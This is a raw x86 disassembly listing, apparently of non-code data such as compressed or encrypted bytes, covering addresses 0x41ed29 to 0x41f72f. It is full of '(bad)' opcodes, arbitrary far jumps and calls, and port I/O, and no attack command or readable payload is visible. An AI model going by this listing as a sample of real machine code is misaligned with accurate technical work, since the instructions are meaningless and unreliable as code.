  41ed29:	cmp    dh,BYTE PTR [ebp+0x30df8461]
  41ed2f:	lods   eax,DWORD PTR ds:[esi]
  41ed30:	cmp    DWORD PTR [esi+0x8],esi
  41ed33:	mov    ds:0xec7f6714,al
  41ed38:	mov    bl,0x2c
  41ed3a:	and    BYTE PTR [esp+esi*8],0x96
  41ed3e:	dec    ebp
  41ed3f:	sub    eax,0x97cf0696
  41ed44:	jl     0x41eda8
  41ed46:	push   cs
  41ed47:	inc    edi
  41ed48:	out    dx,eax
  41ed49:	dec    ecx
  41ed4a:	cmp    eax,0x78090b4c
  41ed4f:	int    0x2a
  41ed51:	mov    ds:0xe4292f45,al
  41ed56:	jae    0x41ed6f
  41ed58:	pop    ebp
  41ed59:	stc    
  41ed5a:	cmp    ebx,DWORD PTR [eax]
  41ed5c:	xchg   edi,eax
  41ed5d:	mov    esp,0x39632771
  41ed62:	dec    eax
  41ed63:	xchg   ecx,eax
  41ed64:	or     BYTE PTR [ecx+0x51],0x6e
  41ed68:	in     al,0x76
  41ed6a:	jg     0x41ed98
  41ed6c:	add    esi,ecx
  41ed6e:	lods   eax,DWORD PTR ds:[esi]
  41ed6f:	jg     0x41ed87
  41ed71:	add    ebp,DWORD PTR [edi+edi*1-0x44]
  41ed75:	mov    eax,ds:0x17a16bd
  41ed7a:	dec    edx
  41ed7b:	jae    0x41eda3
  41ed7d:	daa    
  41ed7e:	div    BYTE PTR [ecx]
  41ed80:	jecxz  0x41ed07
  41ed82:	cwde   
  41ed83:	inc    esp
  41ed84:	adc    al,0x10
  41ed86:	mov    ?,WORD PTR [ebx-0xb]
  41ed89:	xor    bh,al
  41ed8b:	pop    eax
  41ed8c:	das    
  41ed8d:	repnz xchg edx,eax
  41ed8f:	add    bl,BYTE PTR [ebp+0x30]
  41ed92:	ror    ch,1
  41ed94:	push   es
  41ed95:	(bad)  
  41ed96:	mov    edi,0x273e5b86
  41ed9b:	inc    esi
  41ed9c:	daa    
  41ed9d:	pop    edx
  41ed9e:	daa    
  41ed9f:	jge    0x41ed38
  41eda1:	arpl   WORD PTR [edi+eax*1],bp
  41eda4:	mov    cs,WORD PTR [edi]
  41eda6:	out    0xdb,al
  41eda8:	xchg   ecx,eax
  41eda9:	adc    eax,0xbde4d444
  41edae:	in     al,dx
  41edaf:	imul   edx,ebp,0xffffffaf
  41edb2:	sub    DWORD PTR [ecx-0x41],ebp
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x1c75b0a2,al
  41ee23:	pop    DWORD PTR [esi+0x1472071]
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [ebp-0x7b],dh
  41ee30:	dec    ebx
  41ee31:	fs scas al,BYTE PTR es:[edi]
  41ee33:	fwait
  41ee34:	jne    0x41ee0b
  41ee36:	mov    ebx,0xa8ca01b4
  41ee3b:	sbb    al,0x52
  41ee3d:	sub    bl,ah
  41ee3f:	jbe    0x41ee9c
  41ee41:	xor    eax,0xdc879c54
  41ee46:	mov    esi,DWORD PTR [ebp+0x14]
  41ee49:	push   edi
  41ee4a:	test   al,0x2f
  41ee4c:	je     0x41edff
  41ee4e:	xchg   esp,eax
  41ee4f:	ret    0xabfe
  41ee52:	add    eax,0x259b3f6e
  41ee57:	sbb    ah,BYTE PTR [ebx]
  41ee59:	mov    al,0x53
  41ee5b:	sub    al,0xa1
  41ee5d:	mov    gs,WORD PTR [eax+0x1a]
  41ee60:	bound  edi,QWORD PTR [ebx-0x74]
  41ee63:	xor    BYTE PTR [eax+0x15f8a7ce],bh
  41ee69:	ret    
  41ee6a:	xor    DWORD PTR [esi+0xe],esi
  41ee6d:	ins    BYTE PTR es:[edi],dx
  41ee6e:	inc    eax
  41ee6f:	push   eax
  41ee70:	fdivr  QWORD PTR [ebp-0x30c2595]
  41ee76:	clc    
  41ee77:	xor    eax,0x22029355
  41ee7c:	pop    eax
  41ee7d:	repz inc esi
  41ee7f:	xchg   ecx,eax
  41ee80:	sti    
  41ee81:	mov    ebx,0x99565070
  41ee86:	add    BYTE PTR [ecx],dh
  41ee88:	mov    ecx,0x6daafff7
  41ee8d:	and    ebp,ebx
  41ee8f:	leave  
  41ee90:	lahf   
  41ee91:	mov    ds:0xf2eb5d91,al
  41ee96:	retf   
  41ee97:	(bad)  
  41ee98:	adc    DWORD PTR [ebp-0x6a],esp
  41ee9b:	jns    0xa4c683bf
  41eea1:	adc    eax,0xfae423db
  41eea6:	dec    ebx
  41eea7:	xor    eax,0xafa81640
  41eeac:	fsubr  st,st(2)
  41eeae:	lock cmp eax,DWORD PTR [edx+0x4c6037b3]
  41eeb5:	shr    BYTE PTR ss:[edi+0x5a45371],0xdf
  41eebd:	test   DWORD PTR [ecx],edi
  41eebf:	mov    cl,0x26
  41eec1:	inc    edi
  41eec2:	ficomp WORD PTR [edx-0x1febf969]
  41eec8:	pop    esi
  41eec9:	imul   eax,DWORD PTR [edi+ecx*2+0x1f],0x4ff9fb5e
  41eed1:	xor    al,0x41
  41eed3:	mov    edi,0x7597c99
  41eed8:	mov    dh,0xd5
  41eeda:	pusha  
  41eedb:	add    dl,0xe1
  41eede:	lods   eax,DWORD PTR ds:[esi]
  41eedf:	cmp    BYTE PTR [edi+0x65],cl
  41eee2:	lods   eax,DWORD PTR ds:[esi]
  41eee3:	fwait
  41eee4:	and    dh,BYTE PTR [eax+0x41d9d863]
  41eeea:	jmp    0x41ef0f
  41eeec:	out    0xbc,eax
  41eeee:	inc    eax
  41eeef:	nop
  41eef0:	xchg   DWORD PTR [esi-0x33],esp
  41eef3:	push   esi
  41eef4:	adc    BYTE PTR [eax+0x50],dh
  41eef7:	xchg   edi,eax
  41eef8:	push   ebx
  41eef9:	fs xchg edx,eax
  41eefb:	int    0xea
  41eefd:	mov    ah,0x3
  41eeff:	jmp    0xa32f607
  41ef04:	adc    DWORD PTR [edi-0x35],0xeddeeec0
  41ef0b:	fptan  
  41ef0d:	pop    es
  41ef0e:	mov    eax,ds:0x895f91e6
  41ef13:	out    dx,eax
  41ef14:	adc    eax,0x63c1b626
  41ef19:	and    eax,0x77d7914c
  41ef1e:	and    ebp,esp
  41ef20:	fwait
  41ef21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef22:	adc    eax,0xd2680551
  41ef27:	adc    ebp,esi
  41ef29:	mov    esp,es
  41ef2b:	mov    DWORD PTR [ecx+0x7f89a707],esp
  41ef31:	fcomp  DWORD PTR [edi+0x0]
  41ef34:	fld    QWORD PTR [eax]
	...
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x6efceb38]
  41efa3:	mov    BYTE PTR [edx],bh
  41efa5:	dec    edi
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [edi-0x49],bh
  41efb0:	xor    ch,BYTE PTR [edi]
  41efb2:	mov    dl,0x11
  41efb4:	ret    
  41efb5:	xchg   BYTE PTR [esi+edi*8-0x57],dl
  41efb9:	jae    0x41efa7
  41efbb:	or     eax,0x2e1b1ca4
  41efc0:	arpl   bx,bx
  41efc2:	xor    eax,0xe0e491ab
  41efc7:	sahf   
  41efc8:	pop    es
  41efc9:	stos   DWORD PTR es:[edi],eax
  41efca:	and    BYTE PTR [edx+0x194c63de],cl
  41efd0:	and    dh,BYTE PTR [esi]
  41efd2:	lds    ecx,FWORD PTR [ecx+0x2ed60d52]
  41efd8:	inc    eax
  41efd9:	or     eax,0x198ad338
  41efde:	cmp    ch,BYTE PTR [esi-0x7c]
  41efe1:	ja     0x41f04f
  41efe3:	mov    ds:0x3bf4493b,eax
  41efe8:	sub    BYTE PTR [ebp+ebx*1+0x375e5e37],0x3d
  41eff0:	inc    ebp
  41eff1:	(bad)  
  41eff2:	test   al,0xaf
  41eff4:	stc    
  41eff5:	popa   
  41eff6:	(bad)  
  41eff7:	mov    DWORD PTR [ebx-0x2c],edx
  41effa:	jne    0x41f041
  41effc:	fwait
  41effd:	mov    al,ds:0xe81bb6c1
  41f002:	loopne 0x41f04f
  41f004:	call   0xa3f946a1
  41f009:	(bad)  
  41f00a:	push   edx
  41f00b:	cmp    DWORD PTR [edx+0x75],eax
  41f00e:	inc    edi
  41f00f:	add    al,0xdd
  41f011:	jge    0x41effa
  41f013:	test   BYTE PTR [esi+0x37],cl
  41f016:	loope  0x41f078
  41f018:	outs   dx,DWORD PTR ds:[esi]
  41f019:	adc    al,0x34
  41f01b:	pop    edi
  41f01c:	or     edi,ebp
  41f01e:	mov    ah,0x48
  41f020:	and    al,0xdf
  41f022:	and    cl,ah
  41f024:	out    dx,al
  41f025:	pop    ecx
  41f026:	pop    es
  41f027:	jnp    0x41efb1
  41f029:	push   ss
  41f02a:	mov    cl,0xe9
  41f02c:	lds    ebp,FWORD PTR [edi]
  41f02e:	sti    
  41f02f:	sub    BYTE PTR [ecx+0x2fbd87f8],0xb3
  41f036:	sbb    BYTE PTR [ebx+0x6f],bh
  41f039:	or     DWORD PTR [edx],edx
  41f03b:	(bad)  
  41f03c:	pop    edx
  41f03d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f03e:	mov    ebx,0x5bf1671a
  41f043:	pushf  
  41f044:	mov    dl,0x2e
  41f046:	mov    ecx,0x68b4667f
  41f04b:	call   DWORD PTR [ecx+0x2c99d725]
  41f051:	fcmovu st,st(4)
  41f053:	ins    BYTE PTR es:[edi],dx
  41f054:	outs   dx,DWORD PTR ds:[esi]
  41f055:	sbb    dh,bh
  41f057:	push   eax
  41f058:	sub    BYTE PTR [edi+0x57bf4796],bh
  41f05e:	fst    DWORD PTR [eax+eax*1+0x1e791320]
  41f065:	(bad)  
  41f066:	call   0x6ebf:0x7393d0fb
  41f06d:	xchg   esp,eax
  41f06e:	sahf   
  41f06f:	and    ah,bh
  41f071:	popa   
  41f072:	mov    BYTE PTR [ecx-0x28],ch
  41f075:	push   edi
  41f076:	xor    al,0xe8
  41f078:	xchg   BYTE PTR [esi+0x3e3b4fe5],bh
  41f07e:	mov    bh,0xea
  41f080:	in     al,dx
  41f081:	xchg   esi,eax
  41f082:	cmp    cl,BYTE PTR [ebp+ebx*1-0x6f]
  41f086:	sti    
  41f087:	xor    DWORD PTR [ecx],eax
  41f089:	sub    BYTE PTR [esi],ch
  41f08b:	mov    eax,0xd8510fb7
  41f090:	mov    ecx,0x7294c6c1
  41f095:	pop    ss
  41f096:	inc    ebx
  41f097:	or     edi,ebp
  41f099:	mov    esp,0x62bd8186
  41f09e:	push   esp
  41f09f:	inc    edx
  41f0a0:	lock jbe 0x41f0ce
  41f0a3:	clc    
  41f0a4:	inc    edx
  41f0a5:	int3   
  41f0a6:	dec    ecx
  41f0a7:	cmp    eax,DWORD PTR [ebp+0x60ad8939]
  41f0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ae:	in     eax,dx
  41f0af:	(bad)  
  41f0b0:	and    bl,dh
  41f0b2:	rol    DWORD PTR [esi],1
  41f0b4:	mov    ebp,0x0
	...
  41f115:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx+0x5d275d44]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    dh,bl
  41f12f:	inc    edi
  41f130:	xor    DWORD PTR [eax-0x26],0x370d8416
  41f137:	cmp    ebp,ecx
  41f139:	imul   edx,DWORD PTR [ecx],0xd6e6bb8a
  41f13f:	mov    ch,0xe8
  41f141:	inc    esi
  41f142:	xchg   edi,eax
  41f143:	fmul   QWORD PTR [ebp+0x3d]
  41f146:	jle    0x41f0fd
  41f148:	mov    edx,ebp
  41f14a:	xchg   ebp,eax
  41f14b:	xor    bl,BYTE PTR [ebx]
  41f14d:	das    
  41f14e:	xchg   ecx,eax
  41f14f:	clc    
  41f150:	adc    eax,0x223b9cc0
  41f155:	sbb    BYTE PTR [esi+0xc],0xa8
  41f159:	cmp    BYTE PTR [edi-0x2ed4b5c4],al
  41f15f:	adc    BYTE PTR ds:0x11543236,ch
  41f165:	call   0x4473:0xcd8e3c27
  41f16c:	(bad)  
  41f16d:	in     al,dx
  41f16e:	retf   0x628f
  41f171:	out    0x87,al
  41f173:	jmp    0xe5a307e1
  41f178:	jmp    0x41f1b4
  41f17a:	lds    ebp,FWORD PTR [ecx+edi*8-0x5c1501cb]
  41f181:	xchg   ecx,eax
  41f182:	mov    ecx,0x6d5f1b58
  41f187:	sub    eax,esi
  41f189:	rol    esp,1
  41f18b:	sub    eax,0x58ab792b
  41f190:	xor    al,bl
  41f192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f193:	push   ss
  41f194:	sub    esi,esp
  41f196:	jnp    0x41f131
  41f198:	mov    ecx,0x26ba9ec9
  41f19d:	sbb    DWORD PTR [edi-0x5a],0xffffff84
  41f1a1:	add    ah,BYTE PTR [eax+0x54]
  41f1a4:	daa    
  41f1a5:	push   esi
  41f1a6:	add    DWORD PTR [edi-0x734babe],esi
  41f1ac:	xchg   ebp,eax
  41f1ad:	jp     0x41f178
  41f1af:	leave  
  41f1b0:	jmp    0x41f1c1
  41f1b2:	in     al,dx
  41f1b3:	sbb    eax,0xd00cff7e
  41f1b8:	in     al,0xc2
  41f1ba:	popf   
  41f1bb:	jnp    0x41f220
  41f1bd:	mov    cl,BYTE PTR [edx-0x46]
  41f1c0:	fadd   QWORD PTR [ebx]
  41f1c2:	push   0xffffffc3
  41f1c4:	pop    ds
  41f1c5:	pop    edx
  41f1c6:	fistp  WORD PTR [ebp+eiz*2+0xf]
  41f1ca:	adc    edx,edx
  41f1cc:	push   ecx
  41f1cd:	ret    0x4fa5
  41f1d0:	nop
  41f1d1:	into   
  41f1d2:	and    ebp,DWORD PTR [ebp-0x75]
  41f1d5:	sub    eax,0x1a963ceb
  41f1da:	sbb    al,0x44
  41f1dc:	push   eax
  41f1dd:	in     eax,dx
  41f1de:	iret   
  41f1df:	test   al,0xe3
  41f1e1:	sub    BYTE PTR [eax],0x9e
  41f1e4:	fist   DWORD PTR [edx]
  41f1e6:	mov    BYTE PTR [esi+eiz*8-0x6283b68a],ch
  41f1ed:	aas    
  41f1ee:	ja     0x41f266
  41f1f0:	inc    edi
  41f1f1:	jecxz  0x41f1dd
  41f1f3:	cmp    ah,BYTE PTR [eax]
  41f1f5:	fisubr WORD PTR [edx]
  41f1f7:	sub    eax,0x72e11502
  41f1fc:	je     0x41f230
  41f1fe:	retf   
  41f1ff:	push   0xffffff8f
  41f201:	ins    DWORD PTR es:[edi],dx
  41f202:	cmp    edx,0x4f3f776e
  41f208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f209:	idiv   ebx
  41f20b:	stc    
  41f20c:	clc    
  41f20d:	test   DWORD PTR [eax-0x77],edi
  41f210:	push   esi
  41f211:	adc    DWORD PTR [ebx-0x5c],esi
  41f214:	mov    eax,ds:0xbe823d50
  41f219:	aas    
  41f21a:	sbb    ebp,DWORD PTR [eax-0x729e926a]
  41f220:	(bad)  [esp+eax*1]
  41f223:	jb     0x41f264
  41f225:	rcr    dh,0x9
  41f228:	dec    edx
  41f229:	je     0x41f22b
  41f22b:	and    al,0x4a
  41f22d:	mov    WORD PTR [edx+esi*1+0x51],ds
  41f231:	push   ss
  41f232:	ins    DWORD PTR es:[edi],dx
  41f233:	or     al,BYTE PTR [ebx+0x0]
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	dec    edx
  41f2a3:	(bad)  
  41f2a4:	out    0xbe,eax
  41f2a6:	xor    eax,0x700014a
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [ebp+ebx*4-0x2b],ah
  41f2b1:	cld    
  41f2b2:	xchg   ecx,eax
  41f2b3:	jecxz  0x41f2d4
  41f2b5:	add    dl,BYTE PTR [eax+0x42fe82c7]
  41f2bb:	scas   eax,DWORD PTR es:[edi]
  41f2bc:	add    ebx,DWORD PTR [edx]
  41f2be:	add    ebx,DWORD PTR [ecx+ecx*2]
  41f2c1:	xor    eax,0xc03eaee
  41f2c6:	or     DWORD PTR [edx-0x41],ebx
  41f2c9:	fdiv   DWORD PTR [ebp+0x4fa07295]
  41f2cf:	btc    DWORD PTR [ecx],ebx
  41f2d2:	call   0x1c6d8578
  41f2d7:	dec    ebp
  41f2d8:	jns    0x41f33b
  41f2da:	popa   
  41f2db:	jge    0x41f334
  41f2dd:	jmp    0x41f26c
  41f2df:	mul    ebx
  41f2e1:	lahf   
  41f2e2:	xor    BYTE PTR [ecx+0x1],bl
  41f2e5:	es dec ebx
  41f2e7:	mov    bh,BYTE PTR [edi]
  41f2e9:	push   0x7933c132
  41f2ee:	adc    al,0xba
  41f2f0:	imul   ebx,edx,0xfffffff9
  41f2f3:	out    0xd2,al
  41f2f5:	push   ss
  41f2f6:	test   BYTE PTR [ebx],dh
  41f2f8:	adc    bh,BYTE PTR [ebx+0x408ae50a]
  41f2fe:	sub    bh,bl
  41f300:	loope  0x41f2e6
  41f302:	jno    0x41f2a1
  41f304:	lods   al,BYTE PTR ds:[esi]
  41f305:	shr    DWORD PTR [eax-0x3a],0xaa
  41f309:	call   0xc718ee2a
  41f30e:	rcr    DWORD PTR [ecx-0x61c2a75b],cl
  41f314:	mov    ebx,0xa18599f4
  41f319:	sbb    al,0x5e
  41f31b:	push   edx
  41f31c:	rcr    DWORD PTR [edi-0x7b],1
  41f31f:	das    
  41f320:	test   BYTE PTR [esi],dl
  41f322:	inc    ebp
  41f323:	ret    
  41f324:	mov    ?,WORD PTR [ebp-0x1b0b7aa0]
  41f32a:	push   ecx
  41f32b:	mov    ds:0xd4136e29,al
  41f330:	cwde   
  41f331:	(bad)  
  41f332:	and    eax,0x5e1ab1ca
  41f337:	ins    DWORD PTR es:[edi],dx
  41f338:	push   eax
  41f339:	leave  
  41f33a:	cmp    DWORD PTR ds:[ebx-0x719c85b2],0x6c
  41f342:	cmp    ah,cl
  41f344:	ss aam 0x6a
  41f347:	push   ds
  41f348:	sbb    eax,0xbe6011c4
  41f34d:	imul   ecx,DWORD PTR [ebp-0x29241d16],0xef673d91
  41f357:	stc    
  41f358:	mov    WORD PTR [eax],?
  41f35a:	jnp    0x41f325
  41f35c:	aad    0x3f
  41f35e:	sbb    BYTE PTR [ecx+0x26efe347],ah
  41f364:	cmp    bh,BYTE PTR [ebp-0x41ff1a73]
  41f36a:	inc    ecx
  41f36b:	xchg   edx,eax
  41f36c:	mov    ebx,0x3f277cc7
  41f371:	jmp    0x41f3ca
  41f373:	cmc    
  41f374:	fnstenv [ecx+ebx*2-0x54fbf814]
  41f37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f37c:	lahf   
  41f37d:	mov    DWORD PTR [ebp-0x72064ade],esi
  41f383:	inc    ebp
  41f384:	test   eax,0x445e0335
  41f389:	cs std 
  41f38b:	adc    DWORD PTR [ebx-0x4],esp
  41f38e:	push   DWORD PTR [ebx]
  41f390:	mov    esp,0xf0a86ff3
  41f395:	pop    edi
  41f396:	rcr    DWORD PTR [edx+0x7e3b4e3],1
  41f39c:	push   DWORD PTR [ebx+0x34]
  41f39f:	fstp   QWORD PTR [ebp+0x50]
  41f3a2:	sub    esp,DWORD PTR [ebp-0x460d9d6e]
  41f3a8:	push   ds
  41f3a9:	add    eax,0xc215d551
  41f3ae:	std    
  41f3af:	call   0xe448fb64
  41f3b4:	jo     0x41f3b6
	...
  41f416:	cmp    al,0xe7
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	lods   al,BYTE PTR ds:[esi]
  41f423:	push   ss
  41f424:	inc    ebp
  41f425:	mov    DWORD PTR [ebx+ecx*2],edi
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [esi-0x6fb18809],al
  41f433:	cmp    BYTE PTR [edx-0x1b07c1],ah
  41f439:	clc    
  41f43a:	repz jo 0x41f466
  41f43d:	xchg   ebx,eax
  41f43e:	dec    ebx
  41f43f:	dec    ecx
  41f440:	lahf   
  41f441:	(bad)  
  41f442:	jl     0x41f45d
  41f444:	push   0xffffffe3
  41f446:	into   
  41f447:	mov    ecx,0x2b975873
  41f44c:	or     DWORD PTR [ebp-0x46],0xffffffa4
  41f450:	cs push edx
  41f452:	leave  
  41f453:	sar    BYTE PTR [edx-0xf71f9da],1
  41f459:	rcr    ah,cl
  41f45b:	sub    ebp,DWORD PTR [ebp+0x2]
  41f45e:	rol    BYTE PTR [ebp+0x6bd386d2],1
  41f464:	out    0x2d,al
  41f466:	loop   0x41f40b
  41f468:	fmul   DWORD PTR [esi-0x41]
  41f46b:	inc    ebp
  41f46c:	(bad)
  41f46f:	cmp    DWORD PTR [eax+0x10e6b307],0x0
  41f476:	push   es
  41f477:	sub    al,0x8d
  41f479:	cld    
  41f47a:	fimul  DWORD PTR [eiz*4-0x723c14fb]
  41f481:	pop    edi
  41f482:	bound  esi,QWORD PTR [ebp+edi*4+0x6602e81d]
  41f489:	sub    esp,eax
  41f48b:	lods   eax,DWORD PTR ds:[esi]
  41f48c:	jns    0x41f4f6
  41f48e:	mov    ch,0x1f
  41f490:	xchg   edx,eax
  41f491:	arpl   WORD PTR [ebp-0x27793079],si
  41f497:	or     dh,cl
  41f499:	outs   dx,DWORD PTR ds:[esi]
  41f49a:	loop   0x41f513
  41f49c:	sub    DWORD PTR [ebx],ebx
  41f49e:	cmp    eax,0x717d0408
  41f4a3:	pushf  
  41f4a4:	push   cs
  41f4a5:	push   0x4e4f4feb
  41f4aa:	sbb    ah,BYTE PTR [edi-0x50]
  41f4ad:	repz fild WORD PTR [ebx+0x7097b834]
  41f4b4:	add    esp,DWORD PTR [edx+0x405ba75f]
  41f4ba:	cli    
  41f4bb:	xchg   esi,eax
  41f4bc:	fisttp DWORD PTR [edx]
  41f4be:	popf   
  41f4bf:	imul   ebx,DWORD PTR [edi+0x25],0x9fe82b1b
  41f4c6:	test   eax,0xc228494a
  41f4cb:	push   edi
  41f4cc:	mov    ecx,0x264ee22
  41f4d1:	sbb    eax,0xd8cf6cd9
  41f4d6:	xchg   esi,eax
  41f4d7:	cld    
  41f4d8:	dec    ebx
  41f4d9:	int    0x81
  41f4db:	jns    0x41f4bc
  41f4dd:	daa    
  41f4de:	cmp    DWORD PTR [edx],esi
  41f4e0:	adc    BYTE PTR [ebp-0x79],ah
  41f4e3:	xor    eax,0x71edca55
  41f4e8:	push   ds
  41f4e9:	add    BYTE PTR [esi-0x58222235],ah
  41f4ef:	call   0xc941:0x7c1c5f13
  41f4f6:	das    
  41f4f7:	ins    DWORD PTR es:[edi],dx
  41f4f8:	add    bh,dl
  41f4fa:	(bad)  
  41f4fb:	out    0xbf,al
  41f4fd:	fwait
  41f4fe:	fwait
  41f4ff:	mov    ch,0x1f
  41f501:	into   
  41f502:	daa    
  41f503:	inc    ecx
  41f504:	cmc    
  41f505:	sub    dh,bl
  41f507:	outs   dx,BYTE PTR ds:[esi]
  41f508:	adc    BYTE PTR [edi-0x1f],dl
  41f50b:	aam    0x25
  41f50d:	pushf  
  41f50e:	shr    bh,0xad
  41f511:	retf   0xd60c
  41f514:	add    al,0xfe
  41f516:	and    al,BYTE PTR [esi]
  41f518:	pop    ds
  41f519:	jnp    0x41f519
  41f51b:	retf   
  41f51c:	push   esp
  41f51d:	xchg   edi,eax
  41f51e:	dec    ebx
  41f51f:	mov    dl,0x52
  41f521:	stos   DWORD PTR es:[edi],eax
  41f522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f523:	inc    eax
  41f524:	data16 fcom DWORD PTR [ecx-0x14245732]
  41f52b:	xchg   edi,eax
  41f52c:	enter  0x2514,0x24
  41f530:	mov    esi,edx
  41f532:	fs cmp eax,0x99
	...
  41f594:	add    BYTE PTR [eax],al
  41f596:	js     0x41f5cc
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	dec    eax
  41f5a3:	jbe    0x41f56b
  41f5a5:	iret   
  41f5a6:	inc    ebx
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [edi],al
  41f5af:	or     ebp,edx
  41f5b1:	xlat   BYTE PTR ds:[ebx]
  41f5b2:	push   es
  41f5b3:	shl    bl,0xb1
  41f5b6:	imul   edi,DWORD PTR [eax+0x526e21d7],0x4dbf1f56
  41f5c0:	adc    cl,al
  41f5c2:	mov    dl,BYTE PTR [edi-0x64]
  41f5c5:	xchg   ebx,eax
  41f5c6:	and    DWORD PTR [ebx-0x2b],0x270ed796
  41f5cd:	enter  0x8ff,0x6b
  41f5d1:	fldcw  WORD PTR [ecx-0xe45aa1c]
  41f5d7:	jnp    0x41f5eb
  41f5d9:	pop    ds
  41f5da:	sbb    esi,DWORD PTR [eax]
  41f5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5dd:	je     0x41f5ec
  41f5df:	repnz aad 0xff
  41f5e2:	outs   dx,BYTE PTR ds:[esi]
  41f5e4:	xchg   esp,eax
  41f5e6:	mov    dl,0x5
  41f5e8:	mov    al,dl
  41f5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5eb:	inc    ebx
  41f5ec:	dec    esp
  41f5ed:	ins    DWORD PTR es:[edi],dx
  41f5ee:	ss icebp 
  41f5f0:	jmp    0xb806:0xf71bc63e
  41f5f7:	pop    edx
  41f5f8:	daa    
  41f5f9:	adc    eax,0xe761f6ae
  41f5fe:	ficomp WORD PTR [edi-0x58]
  41f601:	mov    esi,0x2ab865be
  41f606:	stos   BYTE PTR es:[edi],al
  41f607:	pop    edi
  41f608:	jge    0x41f5f8
  41f60a:	pushf  
  41f60b:	out    dx,al
  41f60c:	les    esp,FWORD PTR [ecx-0x6e21b543]
  41f612:	stos   DWORD PTR es:[edi],eax
  41f613:	mov    DWORD PTR [esi],ecx
  41f615:	enter  0x655a,0x72
  41f619:	dec    ebp
  41f61a:	in     al,dx
  41f61b:	enter  0xb43c,0xbf
  41f61f:	jge    0x41f612
  41f621:	dec    ebx
  41f622:	xor    DWORD PTR [ecx+0x68510f6d],eax
  41f628:	pop    ss
  41f629:	mov    ds:0xb31468b,al
  41f62e:	inc    edi
  41f62f:	int3   
  41f630:	(bad)  
  41f631:	retf   0x3432
  41f634:	ss pushf 
  41f636:	leave  
  41f637:	push   ds
  41f638:	iret   
  41f639:	loop   0x41f614
  41f63b:	test   BYTE PTR [edx+0x3900ad62],al
  41f641:	outs   dx,DWORD PTR ds:[esi]
  41f642:	pushf  
  41f643:	mov    ebp,0x3e8eb372
  41f648:	std    
  41f649:	pop    ds
  41f64a:	sbb    eax,0xc1f0e973
  41f64f:	repnz sahf 
  41f651:	rcl    BYTE PTR [ebp+0x7f],1
  41f654:	sbb    esi,DWORD PTR [edi-0x73d47e60]
  41f65a:	pop    ds
  41f65b:	cmc    
  41f65c:	and    ah,ch
  41f65e:	lea    ecx,[edi-0x7fec46ec]
  41f664:	mov    ecx,0x969e2b6b
  41f669:	leave  
  41f66a:	push   esi
  41f66b:	ins    DWORD PTR es:[edi],dx
  41f66c:	push   eax
  41f66d:	mov    eax,ds:0x5c2ae0c0
  41f672:	pop    ebp
  41f673:	je     0x41f6ed
  41f675:	sbb    esi,DWORD PTR [ebx+0x5]
  41f678:	cs popf 
  41f67a:	(bad)  
  41f67b:	mov    esp,0xedd761d5
  41f680:	and    al,0x70
  41f682:	xchg   esp,eax
  41f683:	push   esi
  41f684:	retf   
  41f685:	xlat   BYTE PTR ds:[ebx]
  41f686:	std    
  41f687:	jae    0x41f6ad
  41f689:	rol    DWORD PTR [eax+0x5c],cl
  41f68c:	lods   al,BYTE PTR ds:[esi]
  41f68d:	sub    eax,0x5bdae1dc
  41f692:	outs   dx,BYTE PTR ds:[esi]
  41f693:	jmp    0xa153:0x6e62efe7
  41f69a:	inc    DWORD PTR [ecx+edx*2]
  41f69d:	in     al,0x57
  41f69f:	or     al,0x42
  41f6a1:	mov    al,0x18
  41f6a3:	repz jns 0x41f6a4
  41f6a6:	loopne 0x41f6fd
  41f6a8:	test   al,0x8f
  41f6aa:	arpl   si,di
  41f6ac:	push   edi
  41f6ad:	mov    cl,0x3e
  41f6af:	or     DWORD PTR [edi+0x3a9219ed],edi
	...
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [eax],ecx
  41f723:	out    0x23,eax
  41f725:	outs   dx,DWORD PTR ds:[esi]
  41f726:	dec    edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    bh,bh
  41f72f:	ret    
